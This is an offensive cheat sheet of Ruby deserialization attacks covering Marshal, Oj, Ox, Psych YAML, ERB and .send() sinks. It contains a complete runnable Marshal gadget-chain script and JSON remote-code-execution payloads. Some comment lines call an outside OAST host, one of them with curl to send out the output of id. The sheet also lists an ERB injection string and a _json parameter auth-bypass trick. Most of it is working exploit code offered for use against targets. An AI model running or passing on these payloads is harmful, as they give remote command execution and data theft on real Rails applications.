# Ruby deserialization arsenal — Open WHEN: you have confirmed a Ruby Marshal.load / YAML.load / Oj / Ox / Psych sink (Rails session, cache store, restore-from-backup, JSON API reviving objects) and need the runnable gadget chain

## Where Marshal bytes reach the sink in real Rails apps
- Rails cache stores and session stores historically `Marshal`-backed.
- Background-job backends, file-backed object stores, custom binary blobs.
- Magic bytes `04 08` (base64 prefix `BAg`). Minimal vulnerable controller:
```ruby
deserialized = Marshal.load(Base64.decode64(params[:data]))   # RCE sink
```

## Universal Marshal RCE gadget chain (Ruby 2.x, elttam)
The command MUST start with `|` and end with `1>&2` — it is run via Ruby's
`IO.popen`-style pipe inside `Gem::StubSpecification`.
```ruby
#!/usr/bin/env ruby
class Gem::StubSpecification
  def initialize; end
end
stub = Gem::StubSpecification.new
stub.instance_variable_set(:@loaded_from, "|id 1>&2")   # <-- your command

class Gem::Source::SpecificFile
  def initialize; end
end
sf  = Gem::Source::SpecificFile.new
sf.instance_variable_set(:@spec, stub)
osf = Gem::Source::SpecificFile.new

$dl = Gem::DependencyList.new
$dl.instance_variable_set(:@specs, [sf, osf])

class Gem::Requirement
  def marshal_dump; [$dl]; end
end

payload = Marshal.dump(Gem::Requirement.new)
require 'base64'
puts Base64.encode64(payload)        # send to the Marshal.load sink
# quiet OAST swap:  "|nslookup $RAND.oast.live 1>&2"
# exfil id:         "|curl http://$RAND.oast.live/$(id|base64) 1>&2"
```
Gadget classes seen across Ruby/Rails versions: `Gem::StubSpecification`,
`Gem::Source::SpecificFile`, `Gem::DependencyList`, `Gem::Requirement`,
`Gem::SpecFetcher`, `Gem::Version`, `Gem::RequestSet::Lockfile`,
`Gem::Resolver::GitSpecification`, `Gem::Source::Git`.

## Side-effect marker for blind/OAST confirmation
A widely-reused payload-embedded marker that writes a file during unmarshal —
grep the box for it to confirm the chain fired:
```
*-TmTT="$(id>/tmp/marshal-poc)"any.zip
```

## YAML / JSON / XML sinks — kick-off method per library
When the sink isn't binary Marshal, the class is revived via these methods.
Put the gadget class as a HASH KEY (so `hash` is invoked) for Oj/Ox/Psych:

| Library | Wire | Method invoked on load |
|---|---|---|
| Marshal | binary | `_load` |
| Oj      | JSON   | `hash` (class must be a hash key) |
| Ox      | XML    | `hash` (class must be a hash key) |
| Psych   | YAML   | `hash` / `init_with` |
| JSON    | JSON   | `json_create` |

Self-built JSON gadget that triggers a `hash`-based gadget class:
```ruby
class SimpleClass
  def initialize(cmd); @cmd = cmd; end
  def hash; system(@cmd); end          # fires when used as a hash key
end
require 'oj'
puts Oj.dump(SimpleClass.new("nslookup $RAND.oast.live"))
# sink:  Oj.load(json_payload)
```

## Oj — pure-JSON URL-fetch detector (no local class needed)
`URI::HTTP`'s `hash`→`to_s`→`spec`→`fetch_path` makes it hit an arbitrary URL —
a clean blind-deserialization oracle you can drop straight into the body:
```json
{ "^o": "URI::HTTP", "scheme": "s3", "host": "$RAND.oast.live/anyurl?",
  "port": "anyport", "path": "/", "user": "anyuser", "password": "anypw" }
```
Full Oj JSON → RCE (creates a folder, then runs a command via Git spec gadget):
```json
{ "^o": "Gem::Resolver::SpecSpecification",
  "spec": { "^o": "Gem::Resolver::GitSpecification",
    "source": { "^o": "Gem::Source::Git", "git": "zip",
      "reference": "-TmTT=\"$(id>/tmp/anyexec)\"", "root_dir": "/tmp",
      "repository": "anyrepo", "name": "anyname" },
    "spec": { "^o": "Gem::Resolver::Specification",
      "name": "name", "dependencies": [] } } }
```

## YAML via Psych unsafe load
Same Gem gadget chain serializes to YAML; `YAML.load` (pre-Psych-4 default) and
`YAML.unsafe_load` rebuild the objects. Generate with the chain above then
`Psych.dump(obj)` instead of `Marshal.dump`.

## ERB / instance_eval string sinks
If a serialized field reaches `ERB.new(x).result` or `instance_eval`:
```ruby
"<%= system('nslookup $RAND.oast.live') %>"      # ERB-rendered template
```

## `.send()` reflective-call sink (post-deserialize gadget)
If unsanitized input reaches `obj.send(method, arg)`, you can invoke any method:
```ruby
obj.send('eval', '<ruby code>')          # one fully-controlled arg => RCE
obj.send('<user_input>')                 # arg-less / default-arg methods only
```
Enumerate callable zero/default-arg methods to find a sink:
```ruby
m = (o.public_methods + o.private_methods + o.protected_methods).flatten
m.select { |n| [0, -1].include?(o.method(n).arity) }
```

## `_json` parameter pollution (auth-bypass via deserialized body)
A non-hashable body value (e.g. an array) lands under a server-injected `_json`
key. Setting `_json` yourself overrides what later logic reads — if validation
checks one param but action uses `_json`, you bypass it. Send `{"_json": <val>}`.

## Newer chains to try when 2.x universal is patched
- Rails 5.2 `CVE-2019-5420`: dev-mode secret-key derivation → signed-cookie RCE.
- Active Storage insecure deserialization (ZDI) — image-variant blob path.
- Ruby 3.4 universal Marshal chain (Luke Jahnke / Doyensec PoC repo) and the
  `Gem::SafeMarshal` escape — use when the target pins Ruby ≥ 3.4.
